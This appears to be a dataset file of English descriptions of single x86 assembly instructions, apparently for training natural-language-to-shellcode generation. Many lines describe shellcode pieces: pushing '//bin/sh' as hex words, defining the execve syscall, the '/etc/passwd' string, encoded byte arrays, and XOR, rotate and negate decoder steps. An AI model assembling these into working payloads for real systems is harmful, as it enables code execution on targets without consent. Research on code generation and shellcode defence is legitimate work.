+push the word 0x692d onto the stack
+push the word 0x697a onto the stack
+push the word 0x6d6f onto the stack
+push the word 0x6f64 to the stack
+push the word 0x6f64 onto the stack
+push the word 0x7065 onto the stack
+push the word 0x722d onto the stack
+push the word 0x7365 onto the stack
+push the word 0x736e onto the stack
+push the word 0x776f onto the stack
+push the word 0x7773 to the stack
+push the word 0x7773 onto the stack
+push the word 0x8223 onto the stack
+push the word 0xaaaa onto the stack
+push the word 0xb315 onto the stack
+push the word 0xc005 onto the stack
+push the word 0xc005 to the stack
+push the word 0xffff onto the stack
+push the word 0xffff to the stack
+push the word 1 onto the stack and point eax to the stack register
+push the word 10 to the stack
+push the word 100 onto the stack
+push the word 17 onto the stack and point edx to the stack register
+push 2 onto stack
+push the word 2 onto the stack
+push the word 2 onto the stack and point ecx to the stack register
+push the word 21 onto the stack and point ebx to the stack register
+push the word ax onto the stack
+push the word bx onto the stack
+push the word bx to the stack
+push the word cx onto the stack
+push the zero_reg onto the stack
+push zero_reg onto the stack
+declare push_cmd label
+declare the push_cmd label
+push $0x68732f2f onto the stack
+push $0x6e69622f onto the stack
+push $0x632d onto the stack
+push the 0x3905 onto the stack
+push the 0x682d onto the stack
+push the 0x697a onto the stack
+in the routine R1 point to the next byte in esi
+in the routine R1 point to the next word in esi
+in the routine R1 save the shellcode in esi
+declare R2 and point to the next byte in esi
+declare R2 and point to the next word in esi
+define label re
+declare the read label
+declare the reading label
+define the doubleword variable real_number1 and initialize to 1234
+define the doubleword variable real_number2 and initialize 123456
+reserve an array of ten reals for realarray
+reserve array realarray of 10 real numbers
+return
+return the address off the stack and returns control to that location
+return to our program
+return to the address on the top of the stack
+return to where the function was called
+return to caller
+left rotate the byte at the address esi by 0x2 bits
+left rotate the byte in esi 2 times
+rotate 4 bits left the byte starting at the address esi
+left rotate the contents of the edi register by 1 bit
+left rotate the edi register 1 time
+left rotate the contents of the edx register by 0x4 bits
+right rotate the contents of the esi register by 1 bit
+declare the rotate label
+S1 is an array of bytes 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73
+define S2 as the array of bytes 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80
+S3 is an array of words 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73
+define S4 as the array of words 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80
+right shift the contents of eax by 23 bits
+right shift the contents of eax by 31 bits
+right shift the contents of ebx by 31 bits
+right shift the value of register ecx by 2 bits
+right shift the value of register edx by 4 bits
+compare eax with doubleword at edi and set status flags
+compare the contents of the eax register with doubleword at edi and set status flags
+compare the value in eax to the doubleword addressed by edi
+compare the value in the eax register to the doubleword addressed by the edi register
+jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
+jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi
+jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
+jump to the _start label if the value in the eax register is not equal to the doubleword addressed by edi
+jump to the _start label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
+jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi
+jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
+jump to the l1 label if the value in the eax register is not equal to the doubleword addressed by edi
+jump to the l1 label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
+declare section containing uninitialized data
+declare the bss section
+section bss
+declare section bss
+declare bss section
+declare code section .bss
+declare section containing initialized data
+declare the data section
+section data
+section for initialized data
+declare data section
+declare section .data
+declare section containing code
+declare section text
+declare text section
+declare the text section
+section .text
+declare .text section
+declare code section
+declare the set_argv label
+define set_argv label
+define set_mark label
+declare the set_mark label
+declare the setup label
+declare the shell_ret label
+declare the shellcode label
+define shellcodelen equal to the length shellcode
+declare the shift_decode label
+left shift the contents of al by 4 bit positions
+left shift cx
+multiply eax by 2 using left shift
+left shift the contents of eax 16 bits
+multiply eax by 4 using left shift
+left shift the contents of eax by 5 bit positions
+left shift eax by two bits
+multiply ebx by 2 using left shift
+multiply ebx by 4 using left shift
+multiply ecx by 2 using left shift
+multiply ecx by 4 using left shift
+left shift the contents of the edi register by 0x1 bit
+multiply edx by 2 using left shift
+left shift the contents of the edx register by 24 bits
+left shift the contents of edx register by 9 bit positions
+left shift the contents of the edx register by 9 bits
+left shift the contents of the esi register by 0x1 bit
+right shift by 3 bit positions the contents of var variable
+shift right ax by the contents of bl and negate the word in ax
+right shift by 4 bits bl
+shift right bx by the contents of cl and negate the contents of bx
+shift right bx by the contents of dl and negate the byte in bx
+shift right cx by the contents of al and negate the contents of cx
+right shift the contents of the dl register by 1 bit
+divide eax by 2 using right shift
+right shift the contents of eax register by 16 bit positions
+divide eax by 4 using right shift
+divide ebx by 2 using right shift
+divide ebx by 4 using right shift
+divide ecx by 2 using right shift
+divide ecx by 4 using right shift
+divide edx by 2 using right shift
+right shift the contents of the edx register by 16
+divide edx by 4 using right shift
+right shift the contents of the edx register by the byte 16
+right shift the contents of the edx register by the byte 24
+define size to be 1024 bytes large
+declare a constant size and set equal to 50000
+declare the stage label
+declare the start label
+set carry flag
+declare 6 bytes starting at the address str initialized to the ascii character values for hello and the null byte
+declare 4 bytes starting at the address str initialized to the ascii character values for the string 'hey' and 0 respectively
+define string as the byte string 'test.txt'
+define string as the byte string '/bin/sh'
+define string as the byte string '/etc/passwd'
+define string as the byte string 'file.txt'
+define string as the byte string 'file1.txt'
+define string as the byte string 'prova.txt'
+define string as the byte string 'tmp.txt'
+subtract the contents of esi from the 32-bit integer stored at memory location var
+subtract the contents of esi from the 32-bit integer stored at memory location var2
+subtract 0x13 from the al register
+subtract 0x41 from the al register
+subtract the value 1 from the contents of the al register and jump to the l1 label if the result is not negative
+subtract the value 1 from the contents of the al register and jump to the l1 label if the result is not zero
+subtract 88 from the contents of al register and save the result in al
+subtract 88 from the contents of the al register
+subtract ah from al
+subtract 1564 from ax and save the result into ax
+subtract 1564 from the contents of ax register and save the result in ax
+subtract 1662 from ax and save the result into ax
+subtract 1662 from the contents of ax register and save the result in ax
+subtract the contents of the ax register by 1662
+subtract the contents of ax from the contents of ax
+subtract 0x7 from bl and save the result into bl
+subtract 0x7 from the contents in bl and save the result in bl
+subtract 3 from the contents of the bl register
+subtract the value 3 from the contents of the bl register and jump to the stage label if the result is not zero
+subtract the value 4 from the contents of the bl register and jump to the l2 label if the result is not negative
+subtract the decimal value 48 from the nl register
+subtract the contents of the cl register from the contents of the al register and jump to the l2 label if the result is not zero
+subtract the byte in esi from the bl register
+subtract 1634 from bx and save the result into bx
+subtract 1634 from the contents of bx register and save the result in bx
+subtract 1634 from the contents of the bx register
+subtract 1663 from bx and save the result into bx
+subtract 1663 from the contents of the bx register
+subtract the contents of bx register by 1663 and save the result in bx
+subtract the contents of bx from the contents of bx
+subtract the contents of the dx register from the contents of the bx register
+subtract 20h from the 8-bit at memory location buff
+subtract 20h from the 8-bit at memory location ebp+ecx
+subtract 0x4 from the byte at the address edi and negate the result
+negate the byte at the address edi after subtracting the value 7
+subtract the value 8 from the byte in edi and negate it
+subtract 0x1 from the current byte of the shellcode and negate the result
+subtract 0x1 from the byte at the address esi and negate the result
+subtract the value 0x9 from the current byte of the shellcode and then negate the result
+subtract 0xd from the byte at the address esi
+subtract 13 from the byte at the address esi
+subtract 13 from the byte in esi and save the result in esi
+negate the byte at the address esi after subtracting the value 2
+subtract 1 from the contents of the cl register
+subtract the contents of the bl register from the contents of the cl register and jump to the l3 label if the result is not negative
+subtract 0x7ff from the contents in cx and save the result in cx
+subtract 0x7ff from the contents of cx register value and save the result in cx
+subtract the value 5 from the contents of the dl register and jump to the l4 label if the result is not negative
+subtract the contents of al register from the contents of dl register and save the result in dl
+subtract the byte at the address esi from the contents of the dl register
+subtract 15444 from dx and save the result into dx
+subtract 15444 from the contents of the dx register
+subtract the value of the memory at address esp from eax and store into eax
+subtract 0x013ffeff from the contents in eax and save the result in eax
+subtract 0x04feca01 from the contents in eax and save the result in eax
+subtract 0x0efc3532 from the contents in eax and save the result in eax
+subtract 0x2c3d2dff from the contents in eax and save the result in eax
+subtract 0x3217d6d2 from the contents in eax and save the result in eax
+subtract 0x3bd04ede from the contents in eax and save the result in eax
+subtract 0x70445eaf from the contents in eax and save the result in eax
+subtract 216 from the value stored in eax
+decrease eax by 3
+subtract 3e716230 from the contents of the eax register
+subtract 5d455523 from the contents of the eax register
+subtract 5e5d7722 from the contents of the eax register
+subtract 8 from the contents of eax register and save the result in eax
+subtract 8 from the contents of the eax register
+subtract the contents of eax from the contents of eax
+subtract ebx from eax
+subtract the address in ebx from the address in eax
+subtract 20000h from eax register
+subtract 0x2e2aa163 from ebx and save the result into ebx
+subtract 0x2e2aa163 from the contents in ebx and save the result in ebx
+decrease ebx by 2
+subtract the byte 3 from the contents of the ebx register
+subtract the byte value 3 from the contents of ebx and save the result in ebx
+subtract the byte 8 from the contents of the ebx register
+subtract the byte value 8 from the contents of ebx and save the result in ebx
+subtract 0x04baca01 from the contents in ecx and save the result in ecx
+subtract 0x0b454440 from the contents in ecx and save the result in ecx
+subtract 0x1525152a from the contents in ecx and save the result in ecx
+subtract 0x6374612e from the contents in ecx and save the result in ecx
+decrease ecx by 1
+subtract 23 from the contents of the ecx register
+subtract the contents of the ecx register from the contents of the ecx register
+subtract the contents of ecx from the contents of ecx
+subtract ecx from ecx and save the result into ecx
+subtract 0x44444444 from edi and save the result in edi
+subtract 0xffffffdf from edi
+subtract 1768009314 from the contents of the edi register
+subtract 1768009314 from the edi register and save the result in edi
+decrease edx by 4
+subtract the contents of the edx register from the contents of the edx register
+subtract 0x24 from the contents in esp and save the result in esp
+subtract the value 0x28 from the esp register
+subtract 12 from esp register and save the result in esp
+subtract 12 from the contents of the esp register
+make room for one 4-byte local variable
+make room on the stack for local variable
+allocate memory for local variables
+subtract the value 4 from the esp register and save the result in esp
+allocate space on the stack for local variable
+make space on stack
+allocate memory for a variable
+subtract 8 from esp and save the result in esp
+subtract the byte 0x1 from the contents of the esp register
+define sys_execve equal to 0x0b
+define syscall_execve equal to 11
+test the value of the al register
+jump to the label found if the contents of the al register is zero else increment the contents of the ecx register
+if the contents of the al register is zero then jump to the label found else increment the contents of the ecx register
+perform a bitwise and of the contents of ax and the contents of ax
+jump to the label exeunt if the contents of the ax register is not zero else jump to the label carryon
+if the contents of the ax register is not zero then jump to the label exeunt else jump to the label carryon
+jump to the label not_found if the contents of the bl register is not zero
+if the contents of the bl register is not zero then jump to the label not_found
+test the value of cl
+jump to the label ready_to_proxy if the contents of the dl register is not zero
+if the contents of the dl register is not zero then jump to the label ready_to_proxy
+perform a bitwise and on the contents of the eax register
+test the value of eax
+jump to the label _convert if the contents of the eax register is not zero
+if the contents of the eax register is not zero then jump to the label _convert
+jump to the label _parent if the contents of the eax register is not zero else restore the top of the stack into the ecx register
+if the contents of the eax register is not zero then jump to the label _parent else restore the top of the stack into the ecx register
+jump to the label _recv_http_request if the contents of the eax register is not zero else subtract the value 0x6 from the contents of the ecx register
+if the contents of the eax register is not zero then jump to the label _recv_http_request else subtract the value 0x6 from the contents of the ecx register
+jump to the label checkforfile if the contents of the eax register is not zero
+if the contents of the eax register is not zero then jump to the label checkforfile
+jump to the label do_next_accept if the contents of the eax register is not zero
+if the contents of the eax register is not zero then jump to the label do_next_accept
+jump to the label exit_on_error if the contents of the eax register is not zero
+if the contents of the eax register is not zero then jump to the label exit_on_error
+jump to the label l1 if the contents of the eax register is not zero
+if the contents of the eax register is not zero then jump to the label l1
+jump to the label l1 if the contents of the eax register is not zero else call the function myfunct
+if the contents of the eax register is not zero then jump to the label l1 else call the function myfunct
+jump to the label l4 if the contents of the eax register is not zero else call the function search
+if the contents of the eax register is not zero then jump to the label l4 else call the function search
+jump short to the label _parent if the contents of the eax register is not zero
+if the contents of the eax register is not zero then jump short to the label _parent
+jump to the label _while_loop if the contents of the eax register is negative
+if the contents of the eax register is negative then jump to the label _while_loop
+jump to the label close if the contents of the eax register is negative
+if the contents of the eax register is negative then jump to the label close
+jump to the label old_dirent if the contents of the eax register is negative
+if the contents of the eax register is negative then jump to the label old_dirent
+jump short to the label socket if the contents of the eax register is negative
+if the contents of the eax register is negative then jump short to the label socket
+jump to the label check_html if the contents of the eax register is zero
+if the contents of the eax register is zero then jump to the label check_html
+jump to the label check_html if the contents of the eax register is zero else jump to the while label
+if the contents of the eax register is zero then jump to the label check_html else jump to the while label
+jump to the label close if the contents of the eax register is zero
+if the contents of the eax register is zero then jump to the label close
+jump to the label close if the contents of the eax register is zero else move the contents of the edx register into the ebx register
+if the contents of the eax register is zero then jump to the label close else move the contents of the edx register into the ebx register
+jump to the label proc_name if the contents of the eax register is zero
+if the contents of the eax register is zero then jump to the label proc_name
+jump to the label ready_to_proxy if the contents of the eax register is zero
+if the contents of the eax register is zero then jump to the label ready_to_proxy
+jump short to the memory location loc_402B13 if the contents of the eax register is zero
+if the contents of the eax register is zero then jump short to the memory location loc_402B13
+jump short to the memory location loc_402C13 if the contents of the eax register is zero
+if the contents of the eax register is zero then jump short to the memory location loc_402C13
+jump to the label socket if the contents of the eax register is zero
+jump to the label socket if the contents of the eax register is zero else zero out the contents of the eax register
+if the contents of the eax register is zero then jump to the label socket else zero out the contents of the eax register
+jump to the label write if the contents of the eax register is zero, else zero out the contents of the eax register
+if the contents of the eax register is zero then jump to the label write else zero out the contents of the eax register
+test the contents of the ebx register
+test the contents of the ecx register
+perform and operation between si and 01h
+declare the three label
+declare the todo label
+define constant total_students equal to 50
+define two label
+declare the two label
+declare the up label
+declare var byte variable and initialize it to 32
+declare a byte containing the value 64 at label the memory location var
+allocate one byte of memory for var_a variable and initialize it to 232
+create the doubleword variable var_a in memory and initialize it to zero
+allocate one byte of memory for var_b variable and initialize it to 'c'
+declare an uninitialized byte labeled var2
+declare an uninitialized byte referred to as location var2
+reserve 1 byte for variableName1
+reserve 1 word for variableName2
+reserve 1 double word for variableName3
+declare the array of words word_table initialized to 134 345 564 and 123
+define the word value word_value and initialize it to 300
+define word1 unsigned word and initialize it to 65535
+define word2 signed word and initialize it to -32768
+define word3 uninitialized unsigned word
+reserve a word for wordvar
+declare the wrap_around label
+define write_syscall equal to 4
+declare the write label
+define writestring function
+declare the writestring label
+declare a word uninitialized value referred to as location x
+declare an uninitialized word labeled x
+swap the address [ebp+16] with the contents of the ecx register
+swap the contents of eax and ebx
+swap the contents of the eax register with the contents of the ebx register
+exchange eax with ebx
+swap the contents of the eax register with the contents of the ecx register
+swap the contents of the eax register with the contents of the edx register
+swap the contents of eax and esi
+swap the contents of the eax register with the contents of the esi register
+swap the contents of the ebx register with the contents of the eax register
+swap the values of ebx and eax
+swap the values of ebx and eax registers
+exchange the contents of the ebx register with the contents of the eax register
+exchange ebx with ecx
+swap the contents of the ebx register with the contents of the edx register
+swap the contents of the ebx register with the contents of the esp register
+swap the values of ebx and esp registers
+exchange ecx with edx
+swap the contents of the ecx register with the contents of the edx register
+swap the contents of the edi register with the contents of the eax register
+swap the values of edi and eax registers
+swap the values of edx and eax registers
+exchange edx with eax
+swap the values of edx and ebx registers
+swap the contents of the esi register with the contents of the eax register
+swap the values of esi and eax
+swap the values of esi and ebx
+swap the values of esp and esi registers
+swap the values si ebx and bx registers
+perform xor operation between ebx register and the word __flag_byte and save the result in ebx
+perform xor operation between the value stored at the location ecx+116 and bh
+perform a logical xor between the address specified by [ecx + 116] and the bh register and save the result in [ecx + 116]
+perform xor operation between the value stored at the location ecx+116 and dh
+perform a logical xor between the address specified by [ecx + 116] and the dh register and save the result in [ecx + 116]
+perform the xor operation between the value stored at the location ecx and bh
+perform the xor operation between the value stored at the location ecx and dh
+zero out ah register
+clear the ah register
+perform a logical xor between the al register and 0e9h and save the result in al
+perform the xor operation between the al register and the value 0x30
+perform the xor operation between the al register and the value 0x41
+perform the xor operation between the ax register and the value 0x3041
+perform the xor operation between the ax register and the value 0x4f73
+jump to the decoded_shellcode label if the result of the logical xor between the ax register and the value 0x539 is zero
+perform the xor operation between the contents of the ax register and the value 0x7777
+clear the ax register
+zero out ax register
+perform a logical xor between the bl register and 0xbb and save the result in bl
+zero out bl register
+zero out bx register
+perform a logical xor between the byte at the address specified by [esi + ecx - 1] and the bh register and save the result in [esi + ecx - 1]
+perform a logical xor between the byte at the address specified by [esi] and the cl register and save the result in [esi]
+jump short to the EncodedShellcode label if the result of the logical xor between the cl register and the value 0x32 is zero
+perform a logical xor between the cl register and 0xaa and save the result in cl
+perform the xor operation between cl and 0xaa and store the result in cl
+perform a logical xor between the dl register and 0xbb and save the result in dl
+perform the xor operation between dl and 0xbb and store the result in dl
+perform the xor operation between eax register and edi register and store the result in eax
+perform xor operation between eax register and esi register and store the result in eax
+perform the xor operation between eax and 0x58494741 value and store the result in eax
+perform a logical xor between the eax register and 0x58494741 and save the result in eax
+perform the xor operation between the eax register and the value 0x6e696230
+perform a logical xor operation between eax and 0x7575
+perform a logical xor between the eax register and 0xffffffff and save the result in eax
+initialize eax with decimal value 0
+perform xor operation between eax and eax
+reset both lower and uppper bytes of eax to be 0
+reset eax
+set the eax register to null
+zero out eax
+zero out the eax register
+init eax 0
+set eax to 0
+zero out the eax register and jump to the l3 label if the contents of the edx register is equal to the contents of the eax register
+zero out the eax register and jump to the l3 label if the contents of the edx register is not equal to the contents of the eax register
+clean the eax register and move the next byte of the shellcode into the lower byte of the register
+zero out eax and move 0x3 in the lowest byte of the register
+clear eax and move 0x4 in the lowest byte of the register
+clean the eax register and move 5 in the lowest byte of the register
+push zero onto the stack
+zero out the eax register and push zero onto the stack
+clean eax, ebx, ecx and edx
+zero out eax, ebx, ecx and edx registers
+clear eax, ebx and edx
+perform a logical xor between the eax register and the ebx register and save the result in eax
+perform xor operation between eax register and ebx register and store the result in eax
+perform a logical xor between the eax register and the edi register and save the result in eax
+perform a logical xor between the eax register and the esi register and save the result in eax
+perform a logical xor between the ebx register and the ebp register and save the result in ebx
+initialize ebx with 0
+reset both lower and uppper bytes of ebx to be 0
+zero out ebx
+clear the ebx register
+init ebx 0
+reset ebx to 0
+set the ebx register to null
+zero out the ebx register and jump to the exit label if the contents of the eax register is equal to the contents of the ebx register
+clean the ebx register and move the next byte of the shellcode into the lower byte of the register
+clear the ebx register and move the next byte of the shellcode into the lower byte of the register
+zero out ebx and move 0x3 in the lowest byte of the register
+clear the ebx register and move 2 in the lowest byte of the register
+clean the ebx register and move 5 in the lowest byte of the register
+zero out the eax and ebx register
+zero out the eax register and the ebx register
+clear ecx and eax
+zero out ecx, edx and eax
+clean eax and edx
+zero out eax and edx
+push zero onto the stack
+clear the ebx register and push its contents onto the stack
+zero out ebx and edx
+perform a logical xor between the ebx register and the word __flag_byte and save the result in ebx
+perform a logical xor between the ecx register and the dh register and save the result in ecx
+initialize ecx to zero
+initialize ecx with decimal value 0
+reset both lower and uppper bytes of ecx to be 0
+set the ecx register to null
+zero out the ecx register
+zero out ecx
+reset ecx to 0
+clear the ecx register
+zero out the ecx register and jump to the l1 label if the contents of the ebx register is equal to the contents of the ecx register
+clean the ecx register and move the next byte of the shellcode into the lower byte of the register
+clear the ecx register and move the next byte of the shellcode into the lower byte of the register
+clear ecx and move 0x4 in the lowest byte of the register
+zero out eax and ecx
+zero out ecx, edx and eax
+clean eax and edx
+zero out eax and edx
+push zero onto the stack
+clear the ecx register and push its contents onto the stack
+zero out the ecx register and push zero onto the stack
+initialize edi with 0
+clear the edi register
+clean the edx register and move the next byte of the shellcode into the lower byte of the register
+clear the edx register and move the next byte of the shellcode into the lower byte of the register
+initialize edx with the decimal value 0
+initialize edx with the hexadecimal value 0x0
+clear the edx register
+set the contents of edx to zero
+set the edx register to null
+zero out edx
+zero out the edx register
+clear edx register
+reset edx to 0
+clear edx
+zero out the edx register and jump to the l2 label if the contents of the ecx register is equal to the contents of the edx register
+zero out edx and move 0x3 in the lowest byte of the register
+clear edx and move 0x4 in the lowest byte of the register
+clear the edx register and move 2 in the lowest byte of the register
+zero out eax and edx
+zero out the eax and edx register
+zero out the edx register and push zero onto the stack
+push zero onto the stack
+clear the edx register and push its contents onto the stack
+initialize the esi register with the decimal value 0
+init the esi register to 0
+clear the esi register
+clear zero_reg
+declare a doubleword at address y initialized to contain 3000
+create the doubleword variable y in memory and initialize it to zero
+reserve one word for ymmval
+declare three doubleword values initialized to 1 2 and 3 at address z
+declare three doublewords of memory starting at address z and initialized to 1 2 and 3
+create the doubleword variable z in memory and initialize it to zero
